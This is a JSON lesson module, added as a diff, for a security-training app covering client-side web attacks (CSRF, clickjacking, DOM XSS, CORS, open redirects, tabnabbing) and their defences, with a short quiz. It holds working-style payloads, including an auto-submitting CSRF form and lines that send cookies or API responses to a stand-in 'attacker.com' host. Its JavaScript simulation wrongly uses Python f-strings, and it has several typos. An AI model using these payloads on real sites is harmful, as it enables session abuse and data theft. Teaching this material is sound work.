@@ -1,0 +1,119 @@
+{
+    "id": "learn_client_side_attacks",
+    "topicId": "client_side_attacks",
+    "topicTitle": "Client-Side Attacks",
+    "description": "Attacks that target the user's browser or application interface, including CSRF, XSS, and Clickjacking.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "client_intro_1",
+            "type": "content",
+            "title": "The Client Battleground",
+            "content": "# Attacking the User 🧑‍💻\n\nClient-side attacks don't hack the server directly. Instead, they trick the legitimate user's browser into performing actions or revealing data.\n\nThe server trusts the user's browser (cookies, sessions). If we compromise the browser, we compromise the user's identity."
+        },
+        {
+            "id": "csrf_1",
+            "type": "content",
+            "title": "CSRF / XSRF",
+            "content": "# Cross-Site Request Forgery (CSRF) ✉️\n\nAttacking the trust a site has in a user's browser.\n\n## The Scenario\n1.  Alice is logged into `bank.com` (session cookie active).\n2.  Alive visits `evil.com`.\n3.  `evil.com` contains a hidden form that auto-submits a POST request to `bank.com/transfer`.\n4.  The browser sends the request *with* Alice's `bank.com` cookies.\n5.  Bank processes the transfer, thinking Alice authorized it."
+        },
+        {
+            "id": "csrf_code",
+            "type": "content",
+            "title": "CSRF Exploit Code",
+            "content": "# CSRF HTML Exploit 💻\n\n```html\n<!-- Hosted on evil.com -->\n<form action=\"https://bank.com/transfer\" method=\"POST\">\n    <input type=\"hidden\" name=\"to\" value=\"hacker\">\n    <input type=\"hidden\" name=\"amount\" value=\"1000\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n\n> 🛡️ **Defense:** Use **Anti-CSRF Tokens** (unique, random tokens for every state-changing form) and **SameSite Cookies**."
+        },
+        {
+            "id": "csrf_quiz",
+            "type": "quiz",
+            "title": "CSRF Quiz",
+            "content": "Check your understanding.",
+            "quizQuestion": "Which cookie attribute helps mitigate CSRF attacks?",
+            "quizOptions": [
+                "Secure",
+                "HttpOnly",
+                "SameSite",
+                "Expires"
+            ],
+            "correctOptionIndex": 2
+        },
+        {
+            "id": "clickjacking_1",
+            "type": "content",
+            "title": "Clickjacking (UI Redressing)",
+            "content": "# Clickjacking 🖱️\n\nTricking the user into clicking something different from what they see.\n\n## How it Works\n1.  Attacker creates a transparent `<iframe>` loading the target site (e.g., \"Delete Account\" button on Facebook).\n2.  Attacker positions this iframe *over* a decoy button (e.g., \"Win a Prize!\") on their own site.\n3.  User tries to click \"Win a Prize!\" but actually clicks \"Delete Account\" in the invisible iframe."
+        },
+        {
+            "id": "clickjacking_defense",
+            "type": "content",
+            "title": "Defending Clickjacking",
+            "content": "# Stopping UI Redress 🛑\n\nThe server must simply refuse to be framed.\n\n## X-Frame-Options\n-   `DENY`: Never assume to be framed.\n-   `SAMEORIGIN`: Only allow framing by the same site.\n\n## Content-Security-Policy (CSP)\n-   `frame-ancestors 'none';`\n-   The modern replacement for X-Frame-Options."
+        },
+        {
+            "id": "dom_xss_1",
+            "type": "content",
+            "title": "DOM-Based XSS",
+            "content": "# DOM XSS 📄\n\nA type of XSS where the payload is executed as a result of modifying the DOM \"environment\" in the victim's browser used by the original client side script.\n\n## The Flaw\n-   **Source**: A JavaScript input (e.g., `location.hash`, `document.referrer`).\n-   **Sink**: A dangerous execution function (e.g., `innerHTML`, `eval()`).\n-   **Attack**: `site.com#<img src=x onerror=alert(1)>` -> Script reads hash -> puts into innerHTML -> Exploit."
+        },
+        {
+            "id": "dom_xss_code",
+            "type": "content",
+            "title": "DOM XSS Example",
+            "content": "# Vulnerable JS Code ⚠️\n\n```javascript\n// Vulnerable\nvar name = document.location.hash.substring(1);\ndocument.getElementById('welcome').innerHTML = \"Hello \" + name;\n\n// Attack URL: site.com#<script>alert(1)</script>\n```\n\n<!-- FULL_CODE_START\n// DOM XSS Simulation\n\nconsole.log(\"=== DOM-Based XSS Simulation ===\");\n\n// 1. The Vulnerable Sink\nfunction displayWelcomeMessage(input) {\n    // Ideally, we would simulate HTML rendering, but in console we show the logic.\n    console.log(\"[Rendering HTML] <div id='welcome'>Hello \" + input + \"</div>\");\n    \n    if (input.includes(\"<script>\") || input.includes(\"onerror=\")) {\n         console.log(\"[!] ALERT: Malicious JavaScript Executed!\");\n    }\n}\n\n// 2. The Source (Simulating location.hash)\n// Normal usage\nlet safe_hash = \"John\";\nconsole.log(f\"User visits: site.com#{safe_hash}\");\ndisplayWelcomeMessage(safe_hash);\n\n// Malicious usage\nlet malicious_hash = \"<img src=x onerror=alert('HACKED')>\";\nconsole.log(f\"\\nUser visits: site.com#{malicious_hash}\");\ndisplayWelcomeMessage(malicious_hash);\n\nconsole.log(\"\\n[!] Fix: Use .textContent or .innerText instead of .innerHTML\");\nFULL_CODE_END -->"
+        },
+        {
+            "id": "html_injection_1",
+            "type": "content",
+            "title": "HTML Injection",
+            "content": "# HTML Injection 💉\n\nSimpler than XSS. The attacker injects HTML tags, but maybe not script tags (or scripts are blocked).\n\n## Impact\n-   **Defacement**: Changing the look of the site.\n-   **Phishing Form**: Injecting a fake login form that POSTs credentials to the attacker.\n-   **Exfiltration**: `<img src='http://attacker.com/log?cookie=...'>` (if HttpOnly is off)."
+        },
+        {
+            "id": "client_storage_1",
+            "type": "content",
+            "title": "Client-Side Storage",
+            "content": "# Storage Attacks 📦\n\nBrowsers store data in: Cookies, LocalStorage, SessionStorage, IndexedDB.\n\n## Risk\n-   **XSS Access**: Scripts can read LocalStorage and `document.cookie` (unless HttpOnly).\n-   **Insecure Storge**: Developers storing JWTs or sensitive user data in LocalStorage.\n-   **Rule**: LocalStorage is PERMANENT and strictly accessible by JS. No built-in protection like HttpOnly."
+        },
+        {
+            "id": "cors_1",
+            "type": "content",
+            "title": "CORS Attacks",
+            "content": "# CORS Misconfigurations 🚦\n\n**Cross-Origin Resource Sharing (CORS)** relaxes the Same-Origin Policy.\n\n## The Risk\nIf a server sends:\n`Access-Control-Allow-Origin: *`\n`Access-Control-Allow-Credentials: true`\n\n...then **ANY** site can make authenticated requests to your API and read the response. Examples: Reading emails, internal data."
+        },
+        {
+            "id": "cors_exploitation",
+            "type": "content",
+            "title": "Exploiting CORS",
+            "content": "# CORS Exploit Code 💻\n\n```javascript\nvar req = new XMLHttpRequest();\nreq.onload = reqListener;\nreq.open('get','https://victim.com/api/secrets',true);\nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n    location='//attacker.com/log?key='+this.responseText;\n}\n```\n\n> 🛡️ **Fix**: Never use `*` with credentials. Whitelist specific trusted domains."
+        },
+        {
+            "id": "open_redirect_1",
+            "type": "content",
+            "title": "Open Redirects",
+            "content": "# Open Redirects ↪️\n\nAn application endpoint that redirects to a user-supplied URL without validation.\n\n## Scenario\n-   Link: `trustedsite.com/login?next=http://evil.com/login`\n-   User sees `trustedsite.com`, logs in, gets redirected to `evil.com` (which looks identical).\n-   User enters password again (thinking they mistyped), giving creds to attacker."
+        },
+        {
+            "id": "tabnabbing_1",
+            "type": "content",
+            "title": "Tabnabbing",
+            "content": "# Reverse Tabnabbing 🎭\n\nWhen a page links to an external site using `target=\"_blank\"`, the new page gets access to the original window via `window.opener`.\n\n## The Attack\n1.  User clicks link on `forum.com` to `malicious.com`.\n2.  `malicious.com` runs `window.opener.location = 'https://fake-forum.com'`.\n3.  The original tab redirects to a phishing page.\n\n> 🛡️ **Fix**: Add `rel=\"noopener noreferrer\"` to all external links."
+        },
+        {
+            "id": "xss_summary",
+            "type": "content",
+            "title": "Review: XSS Types",
+            "content": "# XSS Refresher 🔄\n\n1.  **Reflected**: Payload in URL, bounces off server. (Phishing links)\n2.  **Stored**: Payload saved in Database, served to everyone. (Comments, Profiles)\n3.  **DOM**: Payload executes entirely in browser JS. (Hash fragments)\n\nAll result in script execution in the victim's session."
+        },
+        {
+            "id": "csp_defense_1",
+            "type": "content",
+            "title": "Content Security Policy",
+            "content": "# CSP: The Browser Firewall 🧱\n\nA powerful header to mitigate client-side attacks.\n\n`Content-Security-Policy: default-src 'self'; script-src 'self' trusted.com;`\n\n## Benefits\n-   **Anti-XSS**: Prevents inline scripts (`<script>...`) and loading scripts from untrusted domains.\n-   **Anti-Clickjacking**: Using `frame-ancestors`.\n-   **Anti-Injection**: Restricts form actions and object sources."
+        },
+        {
+            "id": "client_summary",
+            "type": "content",
+            "title": "Module Summary",
+            "content": "# Wrap Up 🎁\n\n-   **CSRF**: Attacker rides the user's session. Use Tokens.\n-   **Clickjacking**: Invisible overlays. Use X-Frame-Options.\n-   **DOM XSS**: Unsafe JS sinks (`innerHTML`). Use safer alternatives.\n-   **CORS**: Don't trust everyone (`*`).\n-   **CSP**: Defense-in-depth against script injection.\n\nAlways treat the browser environment as hostile!"
+        }
+    ]
+}
